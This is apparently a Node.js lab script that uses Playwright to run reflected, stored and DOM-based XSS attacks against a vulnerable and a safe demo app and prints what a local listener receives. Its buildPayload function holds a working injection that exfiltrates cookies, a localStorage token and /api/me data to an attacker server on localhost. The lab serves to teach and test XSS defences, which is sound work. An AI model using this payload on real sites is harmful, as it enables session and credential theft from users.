// lab.js
// Runs the three attacks against vulnerable-app.js and against safe-app.js in
// a real Chromium, and prints what the "attacker's server" received.
//
//   node lab.js
//
// Needs a Chromium: `npx playwright install chromium`, or set CHROMIUM_PATH.

const { chromium } = require("playwright-core");
const { createApp: createVulnerable } = require("./vulnerable-app");
const { createApp: createSafe } = require("./safe-app");
const { createListener } = require("./attacker-listener");

const listen = (app) =>
  new Promise((resolve) => {
    const server = app.listen(0, () => resolve({ server, port: server.address().port }));
  });

// The injected script: read what it can reach, call the API as the victim,
// and send everything to the attacker's server with an image request.
function buildPayload(attackerPort) {
  const script =
    "(async()=>{const me=await fetch('/api/me').then(r=>r.text());" +
    `new Image().src='http://localhost:${attackerPort}/steal?'+` +
    "new URLSearchParams({cookie:document.cookie,token:String(localStorage.getItem('token')),me}).toString()})()";
  return `<img src=x onerror="${script}">`;
}

async function runScenario(browser, label, createApp, kind) {
  const app = await listen(createApp());
  const attacker = createListener();
  const attackerServer = await listen(attacker.app);
  const base = `http://localhost:${app.port}`;
  const payload = buildPayload(attackerServer.port);

  if (kind === "stored") {
    // The attacker (not the victim) posts the comment.
    await fetch(base + "/comments", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ author: "mallory", text: payload }),
    });
  }

  // The victim logs in, then loads the page the attacker prepared.
  const context = await browser.newContext();
  const page = await context.newPage();
  await page.goto(base + "/login"); // sets the cookies; redirects to "/"
  if (kind === "reflected") await page.goto(`${base}/search?q=${encodeURIComponent(payload)}`);
  if (kind === "dom") {
    const file = createApp === createVulnerable ? "welcome-vulnerable.html" : "welcome-safe.html";
    await page.goto(`${base}/${file}?name=${encodeURIComponent(payload)}`);
  }

  // Give the injected script time to run and the image request time to arrive.
  for (let i = 0; i < 20 && attacker.hits.length === 0; i++) await page.waitForTimeout(100);
  await page.waitForTimeout(200);

  const visibleText = (await page.evaluate(() => document.body.innerText)).replace(/\s+/g, " ").trim();
  const jar = (await context.cookies()).map((c) => `${c.name}${c.httpOnly ? " (HttpOnly)" : ""}`);

  await context.close();
  app.server.close();
  attackerServer.server.close();
  return { label, hits: attacker.hits, visibleText, jar };
}

async function main() {
  const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || undefined, args: ["--no-sandbox"] });

  for (const [title, createApp] of [["VULNERABLE APP", createVulnerable], ["SAFE APP", createSafe]]) {
    console.log(`\n################ ${title}`);
    for (const [kind, label] of [["reflected", "reflected XSS  (GET /search?q=<payload>)"], ["stored", "stored XSS     (payload saved as a comment)"], ["dom", "DOM-based XSS  (/welcome-*.html?name=<payload>)"]]) {
      const r = await runScenario(browser, label, createApp, kind);
      console.log(`\n== ${label}`);
      console.log(`   victim's cookie jar:                 ${r.jar.join(", ")}`);
      console.log(`   requests the attacker's server got:  ${r.hits.length}`);
      if (r.hits.length > 0) {
        const h = r.hits[0];
        console.log(`     document.cookie     -> ${JSON.stringify(h.cookie)}`);
        console.log(`     localStorage token  -> ${JSON.stringify(h.token)}`);
        console.log(`     GET /api/me result  -> ${h.me}`);
      }
      console.log(`   what the victim's page showed:       ${r.visibleText.slice(0, 110)}${r.visibleText.length > 110 ? "..." : ""}`);
    }
  }

  await browser.close();
}

main().catch((err) => {
  console.error("lab failed:", err.message.split("\n")[0]);
  process.exit(1);
});
